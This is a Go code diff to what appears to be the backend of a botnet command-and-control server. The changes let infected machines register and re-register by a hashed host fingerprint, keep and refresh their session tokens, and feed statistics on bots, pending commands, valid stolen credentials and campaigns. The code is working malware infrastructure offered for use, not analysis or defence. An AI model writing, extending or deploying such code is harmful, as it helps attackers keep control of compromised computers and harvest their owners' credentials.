@@ -1,7 +1,10 @@
 package handlers
 
 import (
+	"crypto/sha256"
 	"database/sql"
+	"encoding/hex"
+	"fmt"
 	"net"
 	"time"
 
@@ -42,13 +45,21 @@ func (h *BotHandler) Register(c *fiber.Ctx) error {
 		req.IPAddress = externalIP
 	}
 
+	fp := botFingerprint(req.Hostname, req.IPAddress, req.OS, req.Architecture, req.Username)
+
 	var botID string
-	err := h.db.QueryRow(`
-		INSERT INTO bots (hostname, ip_address, external_ip, os, architecture, username, privileged)
-		VALUES ($1, $2, $3, $4, $5, $6, $7)
-		RETURNING id`,
-		req.Hostname, req.IPAddress, externalIP, req.OS, req.Architecture, req.Username, req.Privileged,
-	).Scan(&botID)
+	err := h.db.QueryRow(`SELECT id FROM bots WHERE fingerprint = $1`, fp).Scan(&botID)
+	if err == sql.ErrNoRows {
+		err = h.db.QueryRow(`
+			INSERT INTO bots (hostname, ip_address, external_ip, os, architecture, username, privileged, fingerprint)
+			VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
+			RETURNING id`,
+			req.Hostname, req.IPAddress, externalIP, req.OS, req.Architecture, req.Username, req.Privileged, fp,
+		).Scan(&botID)
+	} else if err == nil {
+		h.db.Exec(`UPDATE bots SET ip_address = $1, external_ip = $2, last_seen = NOW(), status = 'active' WHERE id = $3`,
+			req.IPAddress, externalIP, botID)
+	}
 	if err != nil {
 		return c.Status(500).JSON(fiber.Map{"error": "failed to register bot"})
 	}
@@ -58,7 +69,10 @@ func (h *BotHandler) Register(c *fiber.Ctx) error {
 		return c.Status(500).JSON(fiber.Map{"error": "failed to generate token"})
 	}
 
-	_, err = h.db.Exec("INSERT INTO bot_tokens (bot_id, token) VALUES ($1, $2)", botID, token)
+	_, err = h.db.Exec(`
+		INSERT INTO bot_tokens (bot_id, token) VALUES ($1, $2)
+		ON CONFLICT (bot_id) DO UPDATE SET token = EXCLUDED.token, created_at = NOW()`,
+		botID, token)
 	if err != nil {
 		return c.Status(500).JSON(fiber.Map{"error": "failed to store token"})
 	}
@@ -163,6 +177,22 @@ func (h *BotHandler) Remove(c *fiber.Ctx) error {
 	return c.JSON(fiber.Map{"status": "removed"})
 }
 
+func (h *BotHandler) RefreshToken(c *fiber.Ctx) error {
+	botID, _ := c.Locals("bot_id").(string)
+
+	token, err := middleware.GenerateToken()
+	if err != nil {
+		return c.Status(500).JSON(fiber.Map{"error": "failed to generate token"})
+	}
+
+	_, err = h.db.Exec(`UPDATE bot_tokens SET token = $1, created_at = NOW() WHERE bot_id = $2`, token, botID)
+	if err != nil {
+		return c.Status(500).JSON(fiber.Map{"error": "failed to update token"})
+	}
+
+	return c.JSON(fiber.Map{"session_token": token})
+}
+
 func (h *BotHandler) Stats(c *fiber.Ctx) error {
 	var totalBots, activeBots, pendingCmds, validCreds, activeCampaigns, totalCampaigns int
 
@@ -181,4 +211,10 @@ func (h *BotHandler) Stats(c *fiber.Ctx) error {
 		"active_campaigns":  activeCampaigns,
 		"total_campaigns":   totalCampaigns,
 	})
+}
+
+func botFingerprint(hostname, ip, osName, arch, username string) string {
+	raw := fmt.Sprintf("%s|%s|%s|%s|%s", hostname, ip, osName, arch, username)
+	h := sha256.Sum256([]byte(raw))
+	return hex.EncodeToString(h[:])
 }
